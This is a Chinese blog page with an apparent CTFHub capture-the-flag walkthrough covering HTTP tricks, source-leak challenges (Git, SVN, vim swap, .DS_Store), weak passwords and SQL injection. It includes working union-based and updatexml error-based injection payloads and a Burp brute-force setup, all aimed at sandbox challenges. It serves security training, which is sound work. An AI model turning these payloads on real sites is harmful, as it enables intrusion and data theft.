<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="CTFHub系列, hybcx&#39;s blog">
    <meta name="description" content="0x00 Web
Web前置技能
HTTP协议-请求方式
题目描述：HTTP 请求方法, HTTP/1.1协议中共定义了八种方法（也叫动作）来以不同方式操作指定的资源。

提示:如果你得到“HTTP方法不允许”错误，你应该请求index.p">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>CTFHub系列 | hybcx&#39;s blog</title>
    <link rel="icon" type="image/png" href="/favicon.png">
    


    <!-- bg-cover style     -->



<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
<link rel="stylesheet" type="text/css" href="/css/matery.css">
<link rel="stylesheet" type="text/css" href="/css/my.css">
<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">




    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
    <link rel="stylesheet" href="/css/post.css">




    
        <link rel="stylesheet" type="text/css" href="/css/reward.css">
    



    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>

<meta name="generator" content="Hexo 7.2.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>


<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span diyFont">hybcx&#39;s blog</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
  <li>
    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">hybcx&#39;s blog</div>
        <div class="logo-desc">
            
            Never really desperate, only the lost of the soul.
            
        </div>
    </div>

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言板
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/4.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">CTFHub系列</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/CTF%E8%B5%9B%E4%BA%8B/">
                                <span class="chip bg-color">CTF赛事</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/CTFHub%E7%B3%BB%E5%88%97/" class="post-category">
                                CTFHub系列
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2023-12-12
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
                    2024-03-03
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    9.4k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    40 分
                </div>
                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h1>0x00 Web</h1>
<h2 id="Web前置技能">Web前置技能</h2>
<h3 id="HTTP协议-请求方式">HTTP协议-请求方式</h3>
<p>题目描述：HTTP 请求方法, HTTP/1.1协议中共定义了八种方法（也叫动作）来以不同方式操作指定的资源。</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231212203559503.png" alt="image-20231212203559503"></p>
<p>提示:如果你得到“HTTP方法不允许”错误，你应该请求index.php。</p>
<p>这里不知道请求的含义，还是看了wp才明白的。。。先说结果，这里说是http请求方法是可以自定义的，那题目让我们使用CTFHUB方法来请求index.php页面，这里我先用bp抓包修改了</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231212204347958.png" alt="image-20231212204347958"></p>
<p>如图拿到flag，不过wp是通过curl的方法来请求的</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http">curl -v -X CTFHUB http://challenge-c76d77da5e3e2f67.sandbox.ctfhub.com:10800/index.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231212204458732.png" alt="image-20231212204458732"></p>
<h3 id="HTTP协议-302跳转">HTTP协议-302跳转</h3>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231212211241224.png" alt="image-20231212211241224"></p>
<p>一个超链接，点击一下看源代码</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231212211253414.png" alt="image-20231212211253414"></p>
<p>发现是要跳转到index.php页面的，但我们实际上是跳转到了index.html，这里就是被重定向了，bp截一手</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231212211347849.png" alt="image-20231212211347849"></p>
<p>成功拿到，当然这里依旧可以用curl命令来访问index.php</p>
<h3 id="HTTP协议-Cookie">HTTP协议-Cookie</h3>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231212211505277.png" alt="image-20231212211505277"></p>
<p>这里说只有admin用户能拿到flag，我们需要伪造cookie</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231212211604661.png" alt="image-20231212211604661"></p>
<p>bp抓包发现admin=0，直觉改为1即可</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231212211631030.png" alt="image-20231212211631030"></p>
<p>拿到flag</p>
<h3 id="HTTP协议-基础认证">HTTP协议-基础认证</h3>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231212212837452.png" alt="image-20231212212837452"></p>
<p>这里我们点击之后需要输入账户密码</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231212212854575.png" alt="image-20231212212854575"></p>
<p>如上图输入之后bp抓包看看</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231212212916214.png" alt="image-20231212212916214"></p>
<p>这意味着我们需要爆破了</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231212213011544.png" alt="image-20231212213011544"></p>
<p>这里还提示我们你知道admin吗，那说明用户名大概率就是admin了</p>
<p>发送到bp的爆破模块开始爆破</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231212213743959.png" alt="image-20231212213743959"></p>
<ol>
<li><code>Payload Processing</code> -&gt; <code>Add</code>-&gt; <code>Add Prefix</code>（添加前缀）-&gt; 输入 <code>admin:</code></li>
<li><code>Payload Processing</code> -&gt; <code>Add</code>-&gt; <code>Encode</code>（添加一个编码方式）-&gt; 选择 Base64 Encode</li>
</ol>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231212213405884.png" alt="image-20231212213405884"></p>
<p><code>Payload Encode</code> 取消勾选 <code>URL-encode</code>, 不然你会看到 base64 之后的 <code>=</code> 会被转成 <code>%3d</code> ，你就算爆破到天荒地老也不会出来</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231212213556193.png" alt="image-20231212213556193"></p>
<p>找到flag</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231212213606302.png" alt="image-20231212213606302"></p>
<p>这里了解一下HTTP基础认证：</p>
<pre class="line-numbers language-none"><code class="language-none">在HTTP中，基本认证（英语：Basic access authentication）是允许http用户代理（如：网页浏览器）在请求时，提供 用户名 和 密码 的一种方式。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231212213834114.png" alt="image-20231212213834114"></p>
<h3 id="HTTP-响应包源代码">HTTP-响应包源代码</h3>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231212214205734.png" alt="image-20231212214205734"></p>
<p>直接右键源代码查看得到</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231212214216206.png" alt="image-20231212214216206"></p>
<h2 id="信息泄露">信息泄露</h2>
<h3 id="目录遍历">目录遍历</h3>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231212214932810.png" alt="image-20231212214932810"></p>
<p>根据题目提示直接点击目录找即可</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231212214947406.png" alt="image-20231212214947406"></p>
<h3 id="PHPINFO">PHPINFO</h3>
<pre class="line-numbers language-none"><code class="language-none">phpinfo() 是php中查看相关信息的函数，当在页面中执行phpinfo()函数时，php会将自身的所有信息全部打印出来。在phpinfo中会泄露很多服务端的一些信息：
例如安装的一些模块、网站绝对路径、服务器自身的操作系统、使用的组件版本等等，在phpinfo中获得的这些信息会为下一步的渗透/做题提供一些帮助<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231212215021863.png" alt="image-20231212215021863"></p>
<p>点击查看phpinfo，全局搜索flag，在环境变量中找到lfag</p>
<h3 id="备份文件下载">备份文件下载</h3>
<h4 id="网站源码">网站源码</h4>
<p>题目描述：当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231212215213639.png" alt="image-20231212215213639"></p>
<p>访问www.zip得到了一个压缩包</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231212215549179.png" alt="image-20231212215549179"></p>
<p>根据提示让我们估计是让我们访问该文件</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231212215622650.png" alt="image-20231212215622650"></p>
<p>拿到flag</p>
<h4 id="bak文件">bak文件</h4>
<pre class="line-numbers language-none"><code class="language-none">有些时候网站管理员可能为了方便，会在修改某个文件的时候先复制一份，将其命名为xxx.bak。而大部分Web Server对bak文件并不做任何处理，导致可以直接下载，从而获取到网站某个文件的源代码<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231212215728521.png" alt="image-20231212215728521"></p>
<p>这里是bak文件泄露，直接访问index.php.bak即可</p>
<h4 id="vim缓存">vim缓存</h4>
<p>当开发人员在线上环境中使用 vim 编辑器，在使用过程中会留下 vim 编辑器缓存，当vim异常退出时，缓存会一直留在服务器上，引起网站源码泄露。</p>
<ul>
<li>vim 交换文件名</li>
</ul>
<p>在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容</p>
<p>以 index.php 为例：第一次产生的交换文件名为 <code>.index.php.swp</code></p>
<p>再次意外退出后，将会产生名为 <code>.index.php.swo</code> 的交换文件</p>
<p>第三次产生的交换文件则为 <code>.index.php.swn</code></p>
<p>根据上述提示我们访问.index.php.swp得到源码</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231212220039409.png" alt="image-20231212220039409"></p>
<h4 id="DS-Store">.DS_Store</h4>
<p>.DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231212220509792.png" alt="image-20231212220509792"></p>
<p>直接访问/.DS_Store访问得到下载文件，不过内容肉眼难辨，需要工具</p>
<p>这里我们用到了 Python-dsstore 这个工具 (<a target="_blank" rel="noopener" href="https://github.com/gehaxelt/Python-dsstore">https://github.com/gehaxelt/Python-dsstore</a>) 来完成 .DS_Store 文件的解析：</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231212221303875.png" alt="image-20231212221303875"></p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231212221320761.png" alt="image-20231212221320761"></p>
<p>访问即可</p>
<h3 id="Git泄露">Git泄露</h3>
<h4 id="Git-Log">Git-Log</h4>
<p>题目描述：当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。请尝试使用BugScanTeam的GitHack完成本题</p>
<p>直接上工具。</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231218175448914.png" alt="image-20231218175448914"></p>
<p>克隆好源代码之后，git log查看历史记录</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231218175524781.png" alt="image-20231218175524781"></p>
<p>发现flag，当前所处的版本为 <code>remove flag</code>，flag 在 <code>add flag</code> 这次提交中</p>
<h5 id="解法一：">解法一：</h5>
<p>直接与 <code>add flag (95819c)</code> 这次提交进行比对</p>
<pre class="line-numbers language-none"><code class="language-none">git diff 3e25d
# 或者
git diff HEAD^<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231218175642115.png" alt="image-20231218175642115"></p>
<h5 id="解法二：">解法二：</h5>
<p>直接切换到 add flag (3e25d) 这个版本</p>
<pre class="line-numbers language-none"><code class="language-none">git reset --hard 3e25d
# 或
git reset --hard HEAD^<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231218175815354.png" alt="image-20231218175815354"></p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231218175827853.png" alt="image-20231218175827853"></p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231218180000146.png" alt="image-20231218180000146"></p>
<h4 id="Git-Stash">Git-Stash</h4>
<p>考点</p>
<ul>
<li>git 泄露 <code>.git/refs/stash</code></li>
<li>stash 用于保存 git 工作状态到 git 栈，在需要的时候再恢复。</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">git stash lish   #查看当前stash中的内容
git stash pop  #将当前stash中的内容弹出，并应用到当前分支对应的工作目录上,可以理解为恢复内容。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>克隆好源码之后：</p>
<h5 id="解法一：-2">解法一：</h5>
<p>执行 git stash list 发现有 stash</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231218200046002.png" alt="image-20231218200046002"></p>
<p>执行 git stash pop 发现从 git 栈中弹出来一个文件，这个文件的内容就是 flag</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231218200112144.png" alt="image-20231218200112144"></p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231218200131951.png" alt="image-20231218200131951"></p>
<h5 id="解法二：-2">解法二：</h5>
<p>如果你使用的  GitHack 工具执行完 git stash show 之后没有显示 stash 记录，那么不妨来尝试这个方法</p>
<ol>
<li>查看 <code>.git/refs/stash</code> 找到 <code>stash</code> 对应的 <code>hash</code></li>
</ol>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231218200218024.png" alt="image-20231218200218024"></p>
<p>git diff 25bfc 即可看到 flag–但我这里没有显示，可能是环境没了的问题</p>
<h4 id="Git-Index">Git-Index</h4>
<p>题目中的index并不是我们理解的web网页，而是一个暂存区，默认存储在.git/index。</p>
<p>关于index的具体知识点大家可以阅读一下这个文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/taiyangdao/article/details/52761572">(Git本地库中的索引（Index）及文件状态概述_易生一世的博客-CSDN博客</a></p>
<pre class="line-numbers language-none"><code class="language-none">git checkout-index命令
将Index中列表的文件检出到工作目录，默认不覆盖已有文件。

    -u, --index，更新所有检出的文件的stat信息（git status）
    -a, --all，检出Index中列表的所有文件
    -f, --force，检出时覆盖已有文件
    -n, --no-create，只再次检出工作目录中已有的文件（不创建任何新文件）
    --，禁用任何参数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231218201612501.png" alt="image-20231218201612501"></p>
<p>这里我是直接读取index目录，结果看到当前目录下多了个txt文件，直接读取得到flag</p>
<h3 id="SVN泄露">SVN泄露</h3>
<p>当开发人员使用 SVN 进行版本控制，对站点自动部署。如果配置不当,可能会将.svn文件夹直接部署到线上环境。这就引起了 SVN 泄露漏洞。</p>
<p>如果访问url/.svn/entries有反应的话，就存在svn泄露。直接上工具利用：<a target="_blank" rel="noopener" href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a> --最好在kali安装</p>
<p>安装教程参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/ljj20020718/article/details/127910891?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170290239416800226572715%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=170290239416800226572715&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-3-127910891-null-null.142%5Ev96%5Epc_search_result_base4&amp;utm_term=svn%E6%B3%84%E9%9C%B2%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85&amp;spm=1018.2226.3001.4187">ctfhub–svn泄露</a></p>
<p>安装好输入以下命令</p>
<pre class="line-numbers language-none"><code class="language-none">./rip-svn.pl -v -u url<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231218203818976.png" alt="image-20231218203818976"></p>
<p>这里必须要<code>ls -al</code>才能看到恢复的.svn文件，之后tree .svn查看文件目录结构</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231218203917706.png" alt="image-20231218203917706"></p>
<p>flag在此目录下，读取即可</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231218203932889.png" alt="image-20231218203932889"></p>
<h3 id="HG泄露">HG泄露</h3>
<p>当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当,可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞。</p>
<p>工具依旧是上述的</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231218204540647.png" alt="image-20231218204540647"></p>
<p>这里测试了半天，以为能在此直接读到flag的，结果看了wp发现直接访问就行。。。实在是没想到</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231218204620280.png" alt="image-20231218204620280"></p>
<p>或者如果这里删掉了该文件，我们可以尝试读取历史文件：路径是 <code>.hg/store/data/flag__2096222060.txt.i </code>注意下划线是两个</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231218204733153.png" alt="image-20231218204733153"></p>
<p>当然也可以直接curl访问</p>
<h2 id="密码口令">密码口令</h2>
<h3 id="弱口令">弱口令</h3>
<p>通常认为容易被别人（他们有可能对你很了解）猜测到或被破解工具破解的口令均为弱口令。</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231218204923615.png" alt="image-20231218204923615"></p>
<p>这里尝试了几下，admin+123456即可</p>
<h3 id="默认口令">默认口令</h3>
<p>题目说了是默认口令，我们可以谷歌关键词搜索一手</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231218210138379.png" alt="image-20231218210138379"></p>
<p>这里也是顺利的在wooyun看了到公开的漏洞，我们尝试一下上述三个账号，第二个是成功的，如下图</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231218210103912.png" alt="image-20231218210103912"></p>
<h2 id="SQL注入">SQL注入</h2>
<h3 id="整数型注入">整数型注入</h3>
<p>判断是否存在注入点：</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http">?id=1 and 1=1
?id=1 and 1=2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>可以发现页面回显不一样。说明是数字型，直接开始注入即可。这里判断字段数是2</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http">爆库：?id=-1 union select 1,database()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231219174121497.png" alt="image-20231219174121497"></p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http">爆表名：?id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231219174102330.png" alt="image-20231219174102330"></p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http">爆列名：?id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='flag'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231219174219464.png" alt="image-20231219174219464"></p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http">爆数据：?id=-1 union select 1,flag from flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231219174300468.png" alt="image-20231219174300468"></p>
<p>当然sqlmap就更简单了</p>
<h3 id="字符型注入">字符型注入</h3>
<p>很简单，只不过需要引号闭合一下，后面用–+注释掉即可，不赘述了</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http">?id=-1' union select 1,flag from flag--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231219174446930.png" alt="image-20231219174446930"></p>
<h3 id="报错注入">报错注入</h3>
<p>简单的报错注入，不需要闭合，直接上payload即可</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http">?id=1 and updatexml(1,concat(0x7e,database()),1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231219174838992.png" alt="image-20231219174838992"></p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http">得到flag：?id=1 and updatexml(1,concat(0x7e,select flag from flag),1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231219174946298.png" alt="image-20231219174946298"></p>
<p>不过报错显示的字符有限，我们爆出后半部分即可</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http">?id=1 and updatexml(1,concat(0x7e,substring((select flag from flag),15,40)),1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231219175106573.png" alt="image-20231219175106573"></p>
<p>完整：<code>ctfhub{51f61213dc2a24ab5fc09fc7}</code></p>
<h3 id="布尔盲注">布尔盲注</h3>
<pre class="line-numbers language-http" data-language="http"><code class="language-http">?id=1 and 1=1
?id=1 and 1=2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
